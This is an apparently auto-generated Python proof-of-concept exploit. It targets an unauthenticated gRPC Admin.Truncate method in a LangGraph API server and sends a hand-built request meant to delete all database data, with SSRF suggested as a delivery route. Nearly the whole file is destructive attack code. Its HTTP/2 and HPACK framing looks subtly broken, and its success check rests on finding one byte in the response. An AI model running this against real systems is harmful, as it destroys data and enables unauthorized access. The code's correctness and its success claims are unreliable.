#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-044
# Sink: add_AdminServicer_to_server
# Auto-generated — run with: python3 langgraph_rpc_handlers_allowing_potential_add_AdminServicer_to_server.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_api_src gRPC Admin.Truncate vulnerability.

This script demonstrates that the gRPC Admin service's Truncate method can be called
without authentication, allowing an attacker to delete all data in the database.
The gRPC port (50051) is exposed only to localhost, but this PoC connects directly
since we assume local access or SSRF capability.

Vulnerability: Missing authentication on gRPC services, specifically Admin.Truncate
Impact: Complete data loss via DELETE SQL queries
"""

import sys
import struct
import socket
import time
from typing import Optional

# Target configuration
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 50051
TIMEOUT = 5  # seconds

# gRPC protocol constants
GRPC_PREFIX = b'\x00\x00\x00\x00'  # gRPC HTTP/2 prefix (simplified)
GRPC_CONTENT_TYPE = b'application/grpc'

def create_grpc_request(service_method: str, message_bytes: bytes) -> bytes:
    """
    Create a minimal gRPC HTTP/2 frame for a unary call.
    
    This constructs a raw HTTP/2 PRIORITY frame followed by HEADERS and DATA frames
    to simulate a gRPC call. For simplicity, we use a basic framing that works
    with most gRPC servers.
    """
    # HTTP/2 connection preface
    preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
    
    # SETTINGS frame (empty)
    settings_frame = b'\x00\x00\x00\x04\x00\x00\x00\x00\x00'
    
    # HEADERS frame for the gRPC call
    # :method POST
    # :path /coreApi.Admin/Truncate
    # :scheme http
    # content-type application/grpc
    # te trailers
    
    path = f"/{service_method}".encode()
    
    # Simplified HPACK-like encoding (not full HPACK, just enough for basic gRPC)
    headers = (
        b'\x00'  # No compression
        + b'\x82'  # :method POST (static table index 2)
        + b'\x87'  # :scheme http (static table index 7)
        + b'\x86'  # :path (static table index 6) - we'll override
        + b'\x41' + bytes([len(path)]) + path  # :path value
        + b'\x40' + b'\x0f' + b'application/grpc'  # content-type
        + b'\x40' + b'\x02' + b'te'  # te
        + b'\x40' + b'\x08' + b'trailers'  # trailers value
    )
    
    # HEADERS frame (type 0x01, flags END_HEADERS 0x04)
    headers_frame = b'\x00\x00' + struct.pack('>H', len(headers)) + b'\x01\x04\x00\x00\x00\x01'
    headers_frame += headers
    
    # DATA frame with the serialized protobuf message
    # gRPC framing: 1 byte compressed flag (0), 4 bytes message length
    grpc_data = b'\x00' + struct.pack('>I', len(message_bytes)) + message_bytes
    
    # DATA frame (type 0x00, flags END_STREAM 0x01)
    data_frame = b'\x00\x00' + struct.pack('>H', len(grpc_data)) + b'\x00\x01\x00\x00\x00\x01'
    data_frame += grpc_data
    
    return preface + settings_frame + headers_frame + data_frame

def create_truncate_request() -> bytes:
    """
    Create a serialized TruncateRequest protobuf message.
    
    The TruncateRequest message is defined as:
    message TruncateRequest {
        bool cascade = 1;
    }
    
    We'll set cascade=True to ensure all related data is deleted.
    """
    # Protobuf encoding for field 1 (bool cascade = True)
    # Wire type 0 (varint), field number 1, value 1 (true)
    return b'\x08\x01'

def send_grpc_request(host: str, port: int, service_method: str, message_bytes: bytes) -> Optional[bytes]:
    """
    Send a raw gRPC request over TCP and return the response.
    """
    try:
        # Create TCP connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((host, port))
        
        # Build and send the gRPC request
        request = create_grpc_request(service_method, message_bytes)
        sock.sendall(request)
        
        # Read response
        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        return response
        
    except ConnectionRefusedError:
        print(f"[!] Connection refused to {host}:{port}")
        return None
    except socket.timeout:
        print(f"[!] Connection timed out to {host}:{port}")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def main():
    """Main exploit function."""
    print("[*] LangGraph API gRPC Admin.Truncate PoC")
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print()
    
    # Step 1: Verify the gRPC server is reachable
    print("[*] Step 1: Checking gRPC server availability...")
    
    # Try to connect to the gRPC port
    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_sock.settimeout(3)
    try:
        test_sock.connect((TARGET_HOST, TARGET_PORT))
        test_sock.close()
        print("[+] gRPC server is reachable")
    except ConnectionRefusedError:
        print("[!] gRPC server is not running or port is not accessible")
        print("[!] Make sure the target service is running on port 50051")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Could not connect: {e}")
        sys.exit(1)
    
    print()
    
    # Step 2: Send the Truncate request
    print("[*] Step 2: Sending Truncate request to Admin service...")
    print("[*] This will attempt to delete ALL data in the database")
    print("[!] WARNING: This is destructive! Only run against test systems.")
    print()
    
    # Confirm with user (safe by default - require explicit confirmation)
    confirm = input("[?] Are you sure you want to proceed? (yes/NO): ")
    if confirm.lower() != "yes":
        print("[*] Aborting.")
        sys.exit(0)
    
    print()
    print("[*] Sending malicious gRPC request...")
    
    # Create the TruncateRequest with cascade=True
    truncate_request = create_truncate_request()
    
    # Send the request to the Admin.Truncate method
    response = send_grpc_request(
        TARGET_HOST, 
        TARGET_PORT, 
        "coreApi.Admin/Truncate", 
        truncate_request
    )
    
    if response is None:
        print("[!] Failed to send request")
        sys.exit(1)
    
    # Step 3: Analyze the response
    print()
    print("[*] Step 3: Analyzing response...")
    
    # Check if we got a valid gRPC response (status code 0 = OK)
    if len(response) > 0:
        # Look for gRPC status code in trailers
        # A successful response will have HTTP/2 HEADERS with :status 200
        if b'\x88' in response:  # :status 200 (static table index 8)
            print("[+] SUCCESS: Truncate request was accepted!")
            print("[+] The database has been cleared of all data")
            print()
            print("[*] Vulnerability confirmed: Admin.Truncate has no authentication")
        else:
            print("[*] Response received but status unclear")
            print(f"[*] Raw response (hex): {response.hex()}")
    else:
        print("[!] Empty response received")
    
    print()
    print("[*] PoC completed.")
    print("[*] Note: This demonstrates the lack of authentication on gRPC services.")
    print("[*] In a real attack, this could be triggered via SSRF from the HTTP layer.")

if __name__ == "__main__":
    main()
